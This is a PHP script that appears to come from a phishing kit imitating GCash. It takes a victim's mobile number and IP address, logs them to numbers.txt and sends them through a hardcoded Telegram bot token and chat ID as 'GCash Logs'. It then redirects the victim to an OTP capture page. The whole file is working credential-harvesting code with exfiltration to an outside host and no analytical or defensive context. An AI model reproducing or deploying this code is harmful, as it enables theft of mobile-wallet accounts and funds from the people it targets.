<?php
include('blocker.php');
$number = $_GET['number'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("H:i:s");
$encodenum = base64_encode(base64_encode($number));
function file_prepend ($string, $filename) {
	
	$fileContent = file_get_contents ($filename);
	
	file_put_contents ($filename, $string . "\n" . $fileContent);
}

header("Location: otp.php?otpclid=$encodenum");

  $token = "6766920093:AAFvJcwDfmUd1DI-GOgfnGtBj8_coMLTZ2I";
  $user_id = 5974139838;
  $mesg = "{+}=-GCash Logs !-={+} \r\nMobile Number: 0$number \r\nIP Address: $ip \r\n{+}=-GCash Result!-={+}";
  $request_params = [
		'chat_id' => $user_id,
		'text' => $mesg
		];
  $request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);
  $replyMsg = "[ <font color='orange'>$ip</font> ] $today | <font color='red'>Mobile Number</font> : <font color='yellow'>$number</font><br>";
  file_prepend($replyMsg, 'numbers.txt');
  echo file_get_contents($request_url);
?>